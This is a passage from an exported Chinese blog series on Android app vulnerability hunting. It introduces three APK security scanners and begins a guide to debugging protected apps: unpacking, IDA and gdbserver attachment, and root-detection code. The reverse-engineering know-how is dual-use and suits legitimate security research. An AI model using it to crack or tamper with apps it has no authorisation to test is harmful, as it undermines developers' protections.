href=\"https://github.com/WindXaa\">WindXaa</a></p>\n<h2 id=\"七、参考文献\"><a href=\"#七、参考文献\" class=\"headerlink\" title=\"七、参考文献\"></a>七、参考文献</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://blog.csdn.net/qq_36383272/article/details/105163579</span><br><span class=\"line\">https://codeantenna.com/a/cnBEw7uwCs</span><br><span class=\"line\">https://developer.aliyun.com/article/767940</span><br><span class=\"line\">https://mabin004.github.io/2019/02/09/itural-APP%E7%A0%94%E7%A9%B6/</span><br><span class=\"line\">https://www.freebuf.com/articles/neopoints/348470.html</span><br><span class=\"line\">https://www.freebuf.com/articles/endpoint/245747.html</span><br></pre></td></tr></table></figure>\n\n","categories":["Android APP漏洞之战"],"tags":["漏洞挖掘","工具"]},{"title":"Android App漏洞之战（4）——（三件套）AppInfoScanner+ApplicationScanner+AppShark","url":"/2023/02/09/bug0004/","content":"<h2 id=\"1-前言\"><a href=\"#1-前言\" class=\"headerlink\" title=\"1.前言\"></a>1.前言</h2><p>从第一次写Android APP漏洞之战系列文章以来，受到了不少朋友的热爱，我也从中收获很大。新的一年的，想想怎么样以第一篇文章开头了，想来想去还是以简单的工具文章开头吧，希望今年的一年能有所收获。</p>\n<span id=\"more\"></span>\n<h2 id=\"2-工具的安装与使用\"><a href=\"#2-工具的安装与使用\" class=\"headerlink\" title=\"2.工具的安装与使用\"></a>2.工具的安装与使用</h2><h3 id=\"2-1-AppInfoScanner\"><a href=\"#2-1-AppInfoScanner\" class=\"headerlink\" title=\"2.1 AppInfoScanner\"></a>2.1 AppInfoScanner</h3><p>该工具是一个移动端的的静态信息收集工具，可以收集移动端的中的关键资产信息，例如：Title、Domain、CDN、指纹信息、状态信息等，该工具可以辅助用于Android APP中的信息泄露、Sql注入等漏洞的挖掘，还例如web接口、爆破敏感路径、找后台、弱口令、SQL注入、XSS、命令执行、其他端口存在的漏洞等等</p>\n<p>项目的开源地址：<a href=\"https://github.com/kelvinBen/AppInfoScanner\">https://github.com/kelvinBen/AppInfoScanner</a></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/bug16/image-20230203124831536.png\" alt=\"image-20230203124831536\"></p>\n<p><strong>（1）搭建环境</strong></p>\n<p>环境要求：Java1.8 python3</p>\n<p>项目结构解析：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">AppInfoScanner</span><br><span class=\"line\">    |-- libs  程序的核心代码</span><br><span class=\"line\">        |-- core</span><br><span class=\"line\">            |-- __init__.py 全局配置信息</span><br><span class=\"line\">            |-- parses.py 用于解析文件中的静态信息</span><br><span class=\"line\">            |-- download.py 用于自动下载APP或者H5页面</span><br><span class=\"line\">            |-- net.py 用于进行网络嗅探，并获取基本信息</span><br><span class=\"line\">        |-- task</span><br><span class=\"line\">            |-- __init__.py 目录初始化文件</span><br><span class=\"line\">            |-- base_task.py 统一任务调度中心</span><br><span class=\"line\"> \t\t\t|-- android_task.py 用于处理Android相关的任务</span><br><span class=\"line\">            |-- download_task.py 用于处理自动下载APP或者H5的任务            </span><br><span class=\"line\">\t\t\t |-- ios_task.py 用于处理iOS相关的任务</span><br><span class=\"line\">            |-- net_task.py 用于处理网络嗅探相关任务</span><br><span class=\"line\">            |-- web_task.py 用于处理Web相关的任务，比如网页右键源代码、H5相关的静态信息</span><br><span class=\"line\">    |-- tools 程序需要依赖的工具</span><br><span class=\"line\">        |-- apktool.jar 用于反编译apk文件，不同平台可能需要进行自我切换</span><br><span class=\"line\">        |-- baksmali.jar 用于反编译dex文件，不同平台可能需要进行自我切换</span><br><span class=\"line\">        |-- strings.exe 用于windows 32下获取iPA的字符串信息</span><br><span class=\"line\">        |-- strings64.exe 用于windows 64的系统获取iPA的字符串信息</span><br><span class=\"line\">    |-- __init__.py 目录初始化文件 </span><br><span class=\"line\">    |-- app.py 主运行程序</span><br><span class=\"line\">    |-- config.py 整个程序的配置文件</span><br><span class=\"line\">    |-- README.md  程序使用说明</span><br><span class=\"line\">    |-- requirements.txt 程序中需要安装的依赖库</span><br><span class=\"line\">    |-- update.md 程序历史版本信息</span><br></pre></td></tr></table></figure>\n\n<p>项目搭建：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">git clone https://github.com/kelvinBen/AppInfoScanner.git</span><br><span class=\"line\">cd AppInfoScanner</span><br><span class=\"line\">python3 -m pip install -r requirements.txt</span><br></pre></td></tr></table></figure>\n\n<p><strong>（2）工具使用</strong></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/bug16/image-20230203125205205.png\" alt=\"image-20230203125205205\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">python app.py android -i &lt;Your APK File or DEX File or APK Download Url or Save File Dir</span><br></pre></td></tr></table></figure>\n\n<p>其他的相关操作可以参考官网网址</p>\n<h3 id=\"2-2-ApplicationScanner\"><a href=\"#2-2-ApplicationScanner\" class=\"headerlink\" title=\"2.2 ApplicationScanner\"></a>2.2 ApplicationScanner</h3><p>该工具是个大佬的开源工具，可以检测常见的Android app漏洞情况，经过探测，很多的漏扫工具都在此基础上进行了扩展，个人开发漏扫工具，该项目是一个很好的参考。很多的工具都基于ApplicationScanner进行了扩展，所以可以根据自己需求进开发漏扫工具。</p>\n<p>项目开源地址：<a href=\"https://github.com/paradiseduo/ApplicationScanner\">https://github.com/paradiseduo/ApplicationScanner</a></p>\n<p>日常渗透测试中对APP中进行关键资产信息收集，比如URL地址、IP地址、关键字等信息的采集等</p>\n<p><strong>（1）搭建环境</strong></p>\n<p>环境要求：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">python3+Java11</span><br></pre></td></tr></table></figure>\n\n<p>然后需要安装一些库：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">npm -g install js-beautify</span><br></pre></td></tr></table></figure>\n\n<p>接着就是按照项目的要求进行安装即可</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt; git clone https://github.com/paradiseduo/ApplicationScanner.git</span><br><span class=\"line\">&gt; cd ApplicationScanner</span><br><span class=\"line\">&gt; pip install -r requirements.txt</span><br></pre></td></tr></table></figure>\n\n<p><strong>（2）工具使用</strong></p>\n<p>最后我们可以直接对目标应用进行处理</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">python3 AppScanner.py -i xxx.apk</span><br></pre></td></tr></table></figure>\n\n<p>使用的效果：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/bug16/image-20230203111934151.png\" alt=\"image-20230203111934151\"></p>\n<p>该工具能扫描一些常规漏洞：目录遍历，webView，pendIntenting，解压缩等等</p>\n<h3 id=\"2-3-AppShark\"><a href=\"#2-3-AppShark\" class=\"headerlink\" title=\"2.3 AppShark\"></a><strong>2.3 AppShark</strong></h3><p>这是字节跳动团队开源的一款app漏扫工具，可以通过编写规则进行app漏洞扫描，也可以进一步辅助工作。</p>\n<p>开源地址：<a href=\"https://github.com/bytedance/appshark\">https://github.com/bytedance/appshark</a></p>\n<p><strong>（1）环境搭建</strong></p>\n<p>环境：jdk11及以上</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">git clone https://github.com/bytedance/appshark.git</span><br></pre></td></tr></table></figure>\n\n<p>拉取项目后，然后配置项目的环境</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">./gradlew build  -x test </span><br></pre></td></tr></table></figure>\n\n<p><strong>（2）工具使用</strong></p>\n<p>使用：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">java -jar build/libs/AppShark-0.1.2-all.jar  config/config.json5</span><br></pre></td></tr></table></figure>\n\n<p>json文件中存放着目标应用和检测的规则</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/bug16/Fr2OSkMLTJ8db4VBdcEN1OA9Rh0e.png\" alt=\"img\"></p>\n<p>我们可以发现目前已有的一些规则，包括Intent重定向，ContentProvider路径等等</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/bug16/Frdo3A1Iy-dhQdWc4emvDGdRYhC6.png\" alt=\"img\"></p>\n<p>然后我们可以观察输出结果：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/bug16/FtqECV6HyYURSNRLIn_pEbptU0fG.png\" alt=\"img\"></p>\n<p>这样使用者可以根据自己的需求进行定制</p>\n<h2 id=\"3-总结\"><a href=\"#3-总结\" class=\"headerlink\" title=\"3.总结\"></a>3.总结</h2><p>本文简单的介绍了当前Android APP漏洞挖掘的三类工具，后续将会使用这三类工具挖掘Android APP中的一些常见的漏洞。实验的样本后续会上传知识星球</p>\n<h2 id=\"4-参考网址\"><a href=\"#4-参考网址\" class=\"headerlink\" title=\"4.参考网址\"></a>4.参考网址</h2><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">https://github.com/kelvinBen/AppInfoScanner</span><br><span class=\"line\">https://github.com/bytedance/appshark</span><br><span class=\"line\">https://github.com/paradiseduo/ApplicationScanner</span><br></pre></td></tr></table></figure>\n\n","categories":["Android APP漏洞之战"],"tags":["漏洞挖掘","工具"]},{"title":"Android App漏洞之战（5）——（调试篇）调试与反调详解","url":"/2023/02/09/bug0005/","content":"<p>[TOC]</p>\n<h2 id=\"一、前言\"><a href=\"#一、前言\" class=\"headerlink\" title=\"一、前言\"></a>一、前言</h2><p>撰写了好长时间，终于写完这篇帖子了，这主要是为了解决当下APP中存在的一些常见调试检测策略，前面系列的文章介绍了很多Android APP中漏洞挖掘的手段和原理，但是面对当下防护手段如此复杂的APP，不掌握一些基本的逆向技巧，我们就更别谈进行APP漏洞挖掘了，本文将开始总结了当下APP的一些安全防护手段和技巧，帮助大家更加高效的进行漏洞挖掘。</p>\n<span id=\"more\"></span>\n<p>本文通过收集了大量的资料，参考了看雪上众多大佬的帖子，肉丝大佬的知识星球等，本文的知识结构为：</p>\n<p>本文第二节主要将检测防护手段的原理</p>\n<p>本文第三节主要介绍当下APP中的动静态防护策略</p>\n<p>本文第四节主要讲当下其他常见的反调试策略绕过方式</p>\n<p>本文第五节将反调试技巧与案例结合，并列举了APP漏洞挖掘实例</p>\n<h2 id=\"二、相关介绍\"><a href=\"#二、相关介绍\" class=\"headerlink\" title=\"二、相关介绍\"></a>二、相关介绍</h2><h3 id=\"1-模拟器检测\"><a href=\"#1-模拟器检测\" class=\"headerlink\" title=\"1.模拟器检测\"></a>1.模拟器检测</h3><p>模拟器是当时比较流行的工具，可以帮助工作人员更加便捷的进行调试工作。而随着APP安全防护技术的进一步发展，模拟器检测技术不断进行完善，使得很多APP不能在模拟器上运行，下面本文收集了当下模拟器检测技术的情况，并在后面拿案例进行讲解</p>\n<p>模拟器检测可以参考:</p>\n<p>看雪sossai大佬的文章：<a href=\"https://bbs.pediy.com/thread-255672.htm\">Android模拟器检测体系梳理 </a></p>\n<p>看雪大佬Vancir大佬的文章：<a href=\"https://bbs.pediy.com/thread-225717.htm\">检测Android虚拟机的方法和代码实现 </a></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/1.png\"></p>\n<p>后面我们将拿一个具体案例来看看android模拟器检测如何具体实现</p>\n<h3 id=\"2-Android动静态调试方法\"><a href=\"#2-Android动静态调试方法\" class=\"headerlink\" title=\"2.Android动静态调试方法\"></a>2.Android动静态调试方法</h3><h4 id=\"（1）静态分析\"><a href=\"#（1）静态分析\" class=\"headerlink\" title=\"（1）静态分析\"></a>（1）静态分析</h4><p>Android上一般使用<code>GDA+jadx-gui+AndroidKiller</code>对APP java层进行静态分析，一般使用<code>ida</code>对so层进行静态分析</p>\n<p><strong>java层静态分析：</strong></p>\n<p>我们拿到一个APP，一般先使用GDA查看是够有加壳，如果有加壳，我们则需要对其进行脱壳</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/2.png\" alt=\"image-20220424113633701\"></p>\n<p>针对于加壳的类型一般分为dex加固和so层加固，我们大多时候只需要解决dex加壳问题，就可以满足我们的一般需求了</p>\n<p>dex加壳一般分为三类：<code>dex整体加壳、函数抽取、dex2c/VMP</code></p>\n<p>dex脱壳解决方案：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">dex整体加固：这种方法往往通过动态加载的形式，交换Application的执行，一般我们可以通过hook方法，找到dex_file的起始地址或大小，进行脱取，也可以通过定制Room方法对关键的函数进行插桩，代表有fdex2、Frida_Dump</span><br><span class=\"line\">函数抽取：这种方法往往通过将函数代码抽取放入so文件中，执行时再从so文件读取还原，我们一般可以通过被动调用延时Dump的方法，或主动调用ArtMethod中invoke函数，触发每一个函数，然后进行回填，代表有youpk和fart</span><br><span class=\"line\">VMP：通过定制的指令集进行解释，这时往往需要手工分析，找到指令的映射表，然后进行一步步解释</span><br></pre></td></tr></table></figure>\n\n<p>我们脱壳后，就进入静态分析的流程</p>\n<p>首先我们需要找到函数的入口点函数：<img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/3.png\" alt=\"image-20220424171201780\"></p>\n<p>我们在AndroidManifest里面找打Main的Activity，或通过AndroidKiller直接找到</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/4.png\" alt=\"image-20220424171232376\"></p>\n<p>然后我们进入对应的入口函数，结合Activity的生命周期，执行流程一步步的分析源码</p>\n<p>我们进行静态分析时，可以进行字符串定位来快速定位到我们需要定位的代码段</p>\n<p>使用<code>GDA+jadx-gui</code>可以很好的查看静态代码段，使用<code>AndroidKiller</code>可以对代码进行修改，然后重新打包签名，当然后面需要面临的就是进一步的绕过签名机制</p>\n<p><strong>so层静态分析：</strong></p>\n<p>分析java层代码时，会可能碰到native函数，这样我们的分析就自然从java层过渡到了so层</p>\n<p>首先我们确定jni函数对应的so文件</p>\n<p>静态注册和动态注册的区别：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">Java_完整包名_类名_方法名：静态注册</span><br><span class=\"line\">JNI_Onload:             动态注册</span><br></pre></td></tr></table></figure>\n\n<p>动态注册加载so文件的两种形式：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">动态注册加载so文件两种方式：</span><br><span class=\"line\">\t(1)System.loadLibrary(&quot;native-lib&quot;);</span><br><span class=\"line\">\t(2)System.load(so文件绝对路径)</span><br></pre></td></tr></table></figure>\n\n<p>所以我们可以直接搜<code>JNI_Onload</code>来判断是否为动态注册</p>\n<p>动态注册：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/5.png\" alt=\"image-20220424132743389\"></p>\n<p>静态注册：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/6.png\" alt=\"image-20220424132820819\"></p>\n<p>然后我们可以进一步进行分析so层中的代码段，下面是一些ida的快捷指令：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">(1)  空格键：切换文本视图与图表视图</span><br><span class=\"line\">(2)  ESC：返回上一个操作地址</span><br><span class=\"line\">(3)  G：搜索地址和符号</span><br><span class=\"line\">(4)  N：对符号进行重命名</span><br><span class=\"line\">(5)  冒号键：常规注释</span><br><span class=\"line\">(6)  分号键：可重复注释</span><br><span class=\"line\">(7)  Alt+M：添加标签</span><br><span class=\"line\">(8)  Ctrl+M:查看标签</span><br><span class=\"line\">(9)  Ctrl+S:查看节的信息</span><br><span class=\"line\">(10)  X：查看交叉应用</span><br><span class=\"line\">(11)  F5:查看伪代码</span><br><span class=\"line\">(12)  Alt+T:搜索文本</span><br><span class=\"line\">(13)  Alt+B:搜索十六进制</span><br><span class=\"line\">(14)  代码数据切换</span><br><span class=\"line\">\tC--&gt;代码/D--&gt;数据/A--&gt;ascii字符串/U--&gt;解析成未定义的内容</span><br><span class=\"line\">(15)  拷贝伪C代码到反汇编窗口:右键&gt;copy to -assembly\t</span><br><span class=\"line\">(16) IDA可以修改so的hex操作数来修改so文件，右键点击“edit”进行修改，</span><br><span class=\"line\">       然后右键点击“edit-patchrogram”提交</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（2）静态分析的防护策略\"><a href=\"#（2）静态分析的防护策略\" class=\"headerlink\" title=\"（2）静态分析的防护策略\"></a>（2）静态分析的防护策略</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">java层：dex加壳技术、混淆技术</span><br><span class=\"line\">so层：so加壳技术、ollvm高级混淆技术</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（3）动态分析\"><a href=\"#（3）动态分析\" class=\"headerlink\" title=\"（3）动态分析\"></a>（3）动态分析</h4><p>Android中动态分析，java层我们一般使用<code>Android Studio</code>和<code>Jeb</code>两类工具进行动态调试，so层我们会使用<code>IDA</code>和<code>GDB</code>来完成动态调试，后面我们会拿一些实质的案例来进行一步步的操作</p>\n<h5 id=\"lt-1-gt-AndroidStudio动态调试\"><a href=\"#lt-1-gt-AndroidStudio动态调试\" class=\"headerlink\" title=\"&lt;1&gt;AndroidStudio动态调试\"></a>&lt;1&gt;AndroidStudio动态调试</h5><p>首先使用AndroidKiller对apk进行反编译，查看其反编译后的工程</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/22.png\" alt=\"image-20220424171303034\"></p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/23.png\" alt=\"image-20220424152342814\"></p>\n<p>把project文件导入Android stdio</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/24.png\" alt=\"image-20220424152413762\"></p>\n<p>问题：导入报错，显示没有setting.zip，可能是Android stdio版本的问题，这里使用的是4.0版本</p>\n<p>安装插件smalidea：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/25.png\" alt=\"image-20220424152413762\"></p>\n<p>配置Android stdio</p>\n<p>1）给smail代码一个root权限</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/26.png\" alt=\"image-20220424152707730\"></p>\n<p>2）配置项目的jdk, 已经配置后可以不用</p>\n<p>3）配置远程调试</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/27.png\" alt=\"image-20220424152707730\"></p>\n<p>添加远程调试remote</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/28.png\" alt=\"image-20220424152821854\"></p>\n<p>4）建立连接</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">adb shell ps  显示当前的注册信息（adb shell ps | find）| grep</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/29.png\" alt=\"image-20220424152859681\"></p>\n<p>查找到当前的进程PID</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/30.png\" alt=\"image-20220424152859681\"></p>\n<p>开始转发端口 </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">adb forward tcp:8700 jdwp:3924</span><br></pre></td></tr></table></figure>\n\n<p>或者将程序挂起：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">adb shell am start -D -n My.XuanAo.LiuYao/.main（包名加进程）</span><br></pre></td></tr></table></figure>\n\n<p>点击调试:</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/31.png\" alt=\"image-20220424153053943\"></p>\n<p>5）开始调试</p>\n<p>下断点</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/32.png\" alt=\"image-20220424153053943\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">注意：Android stdio不能下断点，这是由于Android stdio 版本过高引起的</span><br></pre></td></tr></table></figure>\n\n<p>在虚拟机中运行APP,触发断点，既可以进行调试</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/33.png\" alt=\"image-20220424153053943\"></p>\n<h5 id=\"lt-2-gt-IDA动态调试步骤\"><a href=\"#lt-2-gt-IDA动态调试步骤\" class=\"headerlink\" title=\"&lt;2&gt;IDA动态调试步骤\"></a>&lt;2&gt;IDA动态调试步骤</h5><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">1.</span>创建模拟器（最好使用真机）</span><br><span class=\"line\"><span class=\"number\">2.</span>在<span class=\"variable constant_\">IDA</span>里面找到<span class=\"title function_\">android_server</span>(dbgsrv目录)</span><br><span class=\"line\"><span class=\"number\">3.</span>把android_server文件放到手机/data/local/tmp</span><br><span class=\"line\">\tadb push 文件名 /data/local/tmp</span><br><span class=\"line\"><span class=\"number\">4.</span>打开一个cmd窗口：运行android_server</span><br><span class=\"line\">\t<span class=\"number\">1</span>)adb shell 连接手机</span><br><span class=\"line\">\t<span class=\"number\">2</span>）给一个最高权限：su</span><br><span class=\"line\">\t<span class=\"number\">3</span>）来到/data/local/<span class=\"attr\">tmp</span>:cd /data/local/tmp</span><br><span class=\"line\">\t<span class=\"number\">4</span>)给androi_server一个最高的权限：chmod <span class=\"number\">777</span> android_server</span><br><span class=\"line\">\t<span class=\"number\">5</span>)查看android_server是否拥有权限：ls -l</span><br><span class=\"line\">\t<span class=\"number\">6</span>)运行<span class=\"attr\">andorid_server</span>: ./android_server（端口号默认是：<span class=\"number\">23946</span>）</span><br><span class=\"line\">\t补充：运行andorid_server并且修改端口号：./android_server -p端口号</span><br><span class=\"line\"><span class=\"number\">5.</span>端口转发：</span><br><span class=\"line\">\tadb forward <span class=\"attr\">tcp</span>:端口号 <span class=\"attr\">tcp</span>:端口号（之前转发的端口号是什么，这里就是什么） </span><br><span class=\"line\"><span class=\"number\">6.</span>打开<span class=\"variable constant_\">DDMS</span>：观察程序的端口号</span><br><span class=\"line\"><span class=\"number\">7.</span>挂起程序：</span><br><span class=\"line\">\tadb shell am start -D -n 包名/类名</span><br><span class=\"line\">\t例子：adb shell am start -D -n com.<span class=\"property\">example</span>.<span class=\"property\">javandk1</span>/.<span class=\"property\">MainActivity</span></span><br><span class=\"line\">\t补充：此时观察<span class=\"variable constant_\">DDMS</span>，被调试的程序前面有一个红色的虫子；</span><br><span class=\"line\"><span class=\"number\">8.</span><span class=\"variable constant_\">IDA</span>里面勾选三项</span><br><span class=\"line\">\t<span class=\"number\">1</span>）打开ida,选择<span class=\"keyword\">debugger</span> -第二项-<span class=\"title class_\">Remote</span> <span class=\"title class_\">ARMlinux</span>（第四项）</span><br><span class=\"line\">\t<span class=\"number\">2</span>）添加hostname和portt：</span><br><span class=\"line\">\t\thostname：主机号（默认<span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span>）</span><br><span class=\"line\">\t\tport：端口号（之前android_server运行时的端口号或者端口转发的端口号）</span><br><span class=\"line\">\t<span class=\"number\">3</span>）出来进程列表：选择要调试的程序（可以ctrl+f，搜索包名）</span><br><span class=\"line\">\t<span class=\"number\">4</span>）进来后，勾选三项：</span><br><span class=\"line\">\t<span class=\"title class_\">Suspend</span> on process entry point程序入口点 断下</span><br><span class=\"line\">\t<span class=\"title class_\">Suspend</span> on thread start/exit线程的退出或启动 断下</span><br><span class=\"line\">\t<span class=\"title class_\">Suspend</span> on library load/unload库的加载和卸载 断下</span><br><span class=\"line\">补充：可以直接在这里<span class=\"variable constant_\">F9</span>（左上角有一个三角形）运行程序，然后放手；</span><br><span class=\"line\">     也可以，直接执行第九步，然后<span class=\"variable constant_\">IDA</span>运行程序</span><br><span class=\"line\"><span class=\"number\">9.</span>挂载、释放（放手）</span><br><span class=\"line\">\tjdb -connect com.<span class=\"property\">sun</span>.<span class=\"property\">jdi</span>.<span class=\"property\">SocketAttach</span>:hostname=<span class=\"number\">127.0</span><span class=\"number\">.0</span><span class=\"number\">.1</span>,port=端口号(是ddms里显示的端口<span class=\"number\">8600</span>)</span><br><span class=\"line\">\t补充：此时观察<span class=\"variable constant_\">DDMS</span>，被调试的程序前面有一个绿色的虫子；</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"lt-3-gt-GDB动态调试\"><a href=\"#lt-3-gt-GDB动态调试\" class=\"headerlink\" title=\"&lt;3&gt;GDB动态调试\"></a>&lt;3&gt;GDB动态调试</h5><p>GDB动态调试推荐使用可视化工具<code>HyperPwn</code>,GDB的命令操作手册如下：</p>\n<p><a href=\"https://lldb.llvm.org/use/map.html\">GDB命令操作手册</a></p>\n<p>首先，将gdbserver进行启动</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/89.png\" alt=\"image-20220424161910689\"></p>\n<p>先使用objection来观察要调试的so文件</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/90.png\" alt=\"image-20220424162051255\"></p>\n<p>例如，我们要调试libcamera_client.so</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/91.png\" alt=\"image-20220424162051255\"></p>\n<p>我们此时查看目标进程的状态：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/92.png\" alt=\"image-20220424162051255\"></p>\n<p>此时我们就可以使用gdb去调试端口</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">./gdbserver 0.0.0.0:23946 --attach 11021</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/93.png\" alt=\"image-20220424162051255\"></p>\n<p>我们再打开hyper</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/94.png\" alt=\"image-20220424162051255\"></p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">gdb-multiach  </span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/95.png\" alt=\"image-20220424162051255\"></p>\n<p>然后我们设置</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">set arch arm</span><br><span class=\"line\">set arm fallback-mode thumb</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/96.png\" alt=\"image-20220424162051255\"></p>\n<p>然后我们远程连接</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">target remote 172.31.99.61:23946</span><br></pre></td></tr></table></figure>\n\n<p>ip是我们手机的ip地址，端口号是我们gdbserver转发的端口号，这里我们要注意我们的gdbserver不能关闭</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/97.png\" alt=\"image-20220424162051255\"></p>\n<p>这样就进入了我们的调试界面</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">F8下一跳</span><br><span class=\"line\">F7步入</span><br><span class=\"line\">C 进入下一个断点</span><br><span class=\"line\">ctrl+shift+pageup 显示上一行状态</span><br><span class=\"line\">ctrl+shift+pagedown 显示下一行状态</span><br><span class=\"line\">如果没有调用，我们可以使用frida主动调用</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"（4）动态分析的防护策略\"><a href=\"#（4）动态分析的防护策略\" class=\"headerlink\" title=\"（4）动态分析的防护策略\"></a>（4）动态分析的防护策略</h4><figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">java层：</span><br><span class=\"line\">\tandroid.debuggable=false</span><br><span class=\"line\">so层：</span><br><span class=\"line\">\t通过检测ptrace值的变化</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-Root检测\"><a href=\"#3-Root检测\" class=\"headerlink\" title=\"3.Root检测\"></a>3.Root检测</h3><p>root检测逐渐成为现在的APP防护的一种方式，而我们要进行hook等更多操作，必须要获得root权限</p>\n<p>root检测目前一般分为下面的一些方法：</p>\n<p><img src=\"https://bugs-1307040378.cos.ap-chengdu.myqcloud.com/0005/7.png\" alt=\"image-20220424141415510\"></p>\n<h4 id=\"（1-检测目录中是否含su\"><a href=\"#（1-检测目录中是否含su\" class=\"headerlink\" title=\"（1)  检测目录中是否含su\"></a>（1)  检测目录中是否含su</h4><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">          String[] stringArray = <span class=\"keyword\">new</span> <span class=\"title class_\">String</span>[]&#123;<span class=\"string\">&quot;/system/app/Superuser.apk&quot;</span>,<span class=\"string\">&quot;/sbin/su&quot;</span>,<span class=\"string\">&quot;/system/bin/su&quot;</span>,<span class=\"string\">&quot;/system/xbin/su&quot;</span>,<span class=\"string\">&quot;/data/local/xbin/su&quot;</span>,<span class=\"string\">&quot;/data/local/bin/su&quot;</span>,<span class=\"string\">&quot;/system/sd/xbin/su&quot;</span>,<span class=\"string\">&quot;/system/bin/failsafe/su&quot;</span>,<span class=\"string\">&quot;/data/local/su&quot;</span>,<span class=\"string\">&quot;/su/bin/su&quot;</span>&#125;;</span><br><span class=\"line\">          <span class=\"comment\">//遍历数组路径</span></span><br><span class=\"line\">          <span class=\"comment\">//执行su</span></span><br><span class=\"line\">           String[] stringArray1 = <span class=\"keyword\">new</span> <span class=\"title class_\">String</span>[]&#123;<span 